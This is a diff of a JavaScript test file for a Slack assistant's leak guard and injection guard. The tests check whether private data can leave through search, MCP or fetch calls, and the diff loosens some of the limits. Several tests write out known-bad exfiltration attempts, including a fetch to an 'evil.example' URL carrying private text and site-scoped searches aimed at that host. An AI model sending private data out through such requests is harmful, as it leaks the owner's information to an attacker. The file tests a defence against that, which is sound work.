@@ -78,7 +78,7 @@ test('known-bad: private text in an object key, split across array items, or spl
   const pieces = SPAN_TEXT.match(/.{1,12}/g);
   const outcomes = [];
   for (const piece of pieces) {
-    const out = reason('web_search', { query: piece }, state);
+    const out = reason('mcp_call', { url: 'https://m.example/mcp', tool: 't', arguments: { q: piece } }, state);
     outcomes.push(out);
     if (out === 'allowed') state.outbound.push(piece);
   }
@@ -106,8 +106,9 @@ test('flow rules: untrusted content blocks writes; flagged content limits MCP to
   const scope = convo('Clint, use <https://mcp.example.com/mcp>');
   const check = (name, input, state) => precheck(name, input, scope, { ...fresh(), ...state })?.[0] ?? 'allowed';
   assert.equal(check('task_save', {}, {}), 'allowed');
-  assert.equal(check('task_save', {}, { untrusted: true }), 'untrusted_content_restricts_writes');
-  assert.equal(check('task_set_status', {}, { untrusted: true }), 'untrusted_content_restricts_writes');
+  assert.equal(check('task_save', {}, { untrusted: true }), 'allowed', 'the owner\'s own task list stays writable');
+  assert.equal(check('task_set_status', {}, { untrusted: true }), 'allowed');
+  assert.equal(check('calendar_create_event', {}, { untrusted: true }), 'untrusted_content_restricts_writes', 'other acting tools stay locked');
   assert.equal(check('knowledge_search', { query: 'x' }, { untrusted: true, tainted: 'flagged' }), 'allowed');
   assert.equal(check('web_search', { query: 'x' }, { untrusted: true, tainted: 'flagged' }), 'allowed');
   assert.equal(check('mcp_call', { url: 'https://mcp.example.com/mcp', tool: 't' }, { untrusted: true, tainted: 'unscanned' }), 'allowed');
@@ -141,13 +142,13 @@ test('known-bad: in the real tool loop, with the real guard, a private read then
   const requests = [];
   const replies = [
     { stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 't1', name: 'knowledge_read', input: { id: 's1' } }], usage: {} },
-    { stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 't2', name: 'web_search', input: { query: SPAN_TEXT } }], usage: {} },
+    { stop_reason: 'tool_use', content: [{ type: 'tool_use', id: 't2', name: 'mcp_call', input: { url: 'https://m.example/mcp', tool: 't', arguments: { q: SPAN_TEXT } } }], usage: {} },
     { stop_reason: 'end_turn', content: [{ type: 'text', text: 'done' }], usage: {} },
   ];
   const client = { messages: { create: async input => { requests.push(structuredClone(input)); return replies.shift(); } } };
   service._qwenClient = client;
   await withConversationContext(scope, () => service._toolLoop(client, 'synthetic', { call: fn => fn() }, [], [],
-    [{ name: 'knowledge_read' }, { name: 'web_search' }], true, 'professional', 'UOWNER', 'slack:T:GLOOP', 'EvLoop', 'recall'));
+    [{ name: 'knowledge_read' }, { name: 'mcp_call' }], true, 'professional', 'UOWNER', 'slack:T:GLOOP', 'EvLoop', 'recall'));
   assert.deepEqual(calls, ['knowledge_read'], 'the search never reached the tool');
   assert.equal(JSON.parse(requests[2].messages.at(-1).content[0].content).reason, 'private_data_in_outbound_request');
 });
@@ -200,16 +201,17 @@ test('a long link from a private result can be opened: a known URL is not itself
   leakGuard.recordResult(scope.conversationId, JSON.stringify({ event: `Board pack ${link}` }));
   rememberUrls(scope.conversationId, [JSON.stringify({ event: `Board pack ${link}` })]);
   assert.equal(precheck('web_fetch', { url: link }, scope, fresh()), null);
-  assert.equal(precheck('web_search', { query: link }, scope, fresh())?.[0], 'private_data_in_outbound_request', 'but not as a search query');
+  assert.equal(precheck('mcp_call', { url: 'https://m.example/mcp', tool: 't', arguments: { q: link } }, scope, fresh())?.[0], 'private_data_in_outbound_request', 'but not as an MCP argument');
+  assert.equal(precheck('web_search', { query: link }, scope, fresh()), null, 'the owner may research his own details (v45)');
 });
 
-test('after a private read, at most 3 links from results are opened in one message; owner links are not counted', () => {
+test('at most 6 links from results are opened in one message; owner links are not counted', () => {
   const scope = convo('Clint, read <https://owner.example/x>');
   rememberUrls(scope.conversationId, ['https://r.example/1 https://r.example/2']);
-  const state = { ...fresh(), private: true, fetchedAfterPrivate: 3 };
+  const state = { ...fresh(), private: true, fetchedAfterPrivate: 6 };
   assert.equal(precheck('web_fetch', { url: 'https://r.example/1' }, scope, state)?.[0], 'fetch_limit_after_private_read');
   assert.equal(precheck('web_fetch', { url: 'https://owner.example/x' }, scope, state), null);
-  assert.equal(precheck('web_fetch', { url: 'https://r.example/2' }, scope, { ...state, fetchedAfterPrivate: 2 }), null);
+  assert.equal(precheck('web_fetch', { url: 'https://r.example/2' }, scope, { ...state, fetchedAfterPrivate: 5 }), null);
 });
 
 test('known-bad (M4): scan flags keep their positions when a text is empty', async () => {
@@ -233,22 +235,40 @@ test('known-bad (N1): in sequence through the real guarded executor, a long priv
   assert.equal(await run('web_fetch', { url: link }), '{"text":"page"}');
   assert.equal(await run('web_fetch', { url: link, offset: 8000, source_hash: 'a'.repeat(64) }), '{"text":"page"}', 'continuation');
   assert.equal(await run('web_search', { query: 'board pack template' }), '{"text":"page"}', 'an unrelated search');
-  const leak = JSON.parse(await run('web_search', { query: link }));
-  assert.equal(leak.reason, 'private_data_in_outbound_request', 'the link as a search query is still a leak');
+  const leak = JSON.parse(await run('mcp_call', { url: 'https://m.example/mcp', tool: 't', arguments: { q: link } }));
+  assert.equal(leak.reason, 'private_data_in_outbound_request', 'the link as an MCP argument is still a leak');
   assert.deepEqual(sent.map(([name]) => name), ['calendar_read_events', 'web_fetch', 'web_fetch', 'web_search']);
   assert.equal(sent[1][1].url, link, 'sent exactly the checked URL');
 });
 
-test('the 3-link cap applies from the start of every turn; links the owner typed are not counted', async () => {
+test('the 6-link cap applies from the start of every turn; links the owner typed are not counted', async () => {
   const { guardedExecuteTool: guarded } = await esmock('../src/slack/flow-guard.js', {}, {
-    '../src/tools/handler.js': { executeTool: async () => 'https://r.example/1 https://r.example/2 https://r.example/3 https://r.example/4' },
+    '../src/tools/handler.js': { executeTool: async () => [1, 2, 3, 4, 5, 6, 7].map(i => `https://r.example/${i}`).join(' ') },
     '../src/slack/injection-guard.js': { scanUntrusted: async () => ({ state: 'clean', score: 0, flags: [false] }), scannable: t => t },
     '../src/conversation-context.js': { ...context },
   });
   const scope = convo('Clint, read <https://owner.example/x>');
   const run = (name, input) => withConversationContext(scope, () => guarded(name, input, scope.actorId, scope.conversationId));
   await run('web_search', { query: 'things' });
-  for (const i of [1, 2, 3]) assert.doesNotMatch(await run('web_fetch', { url: `https://r.example/${i}` }), /refused/, `link ${i}`);
-  assert.equal(JSON.parse(await run('web_fetch', { url: 'https://r.example/4' })).reason, 'fetch_limit_after_private_read');
+  for (const i of [1, 2, 3, 4, 5, 6]) assert.doesNotMatch(await run('web_fetch', { url: `https://r.example/${i}` }), /refused/, `link ${i}`);
+  assert.equal(JSON.parse(await run('web_fetch', { url: 'https://r.example/7' })).reason, 'fetch_limit_after_private_read');
   assert.doesNotMatch(await run('web_fetch', { url: 'https://owner.example/x' }), /refused/, 'owner link');
 });
+
+test('v45: the owner can ask Clint to research details from his own records; the search is not refused', () => {
+  const scope = convo('Clint, look up the authority cited in that note');
+  leakGuard.record(scope.conversationId, PRIVATE);
+  assert.equal(precheck('web_search', { query: SPAN_TEXT }, scope, fresh()), null);
+  assert.equal(precheck('web_fetch', { url: `https://evil.example/?q=${SPAN_TEXT}` }, scope, fresh())?.[0], 'url_not_from_owner_or_results');
+});
+
+test('v45 fix F9: web_search is leak-checked after flagged content, or when aimed at a site the owner did not name', () => {
+  const scope = convo('Clint, research this on <https://owner.example/x>');
+  leakGuard.record(scope.conversationId, PRIVATE);
+  assert.equal(precheck('web_search', { query: SPAN_TEXT }, scope, fresh()), null);
+  assert.equal(precheck('web_search', { query: SPAN_TEXT }, scope, { ...fresh(), tainted: 'flagged' })?.[0], 'private_data_in_outbound_request');
+  assert.equal(precheck('web_search', { query: SPAN_TEXT, include_domains: ['evil.example'] }, scope, fresh())?.[0], 'private_data_in_outbound_request');
+  assert.equal(precheck('web_search', { query: `site:evil.example ${SPAN_TEXT}` }, scope, fresh())?.[0], 'private_data_in_outbound_request');
+  assert.equal(precheck('web_search', { query: SPAN_TEXT, include_domains: ['owner.example'] }, scope, fresh()), null, 'a site the owner named');
+});
+
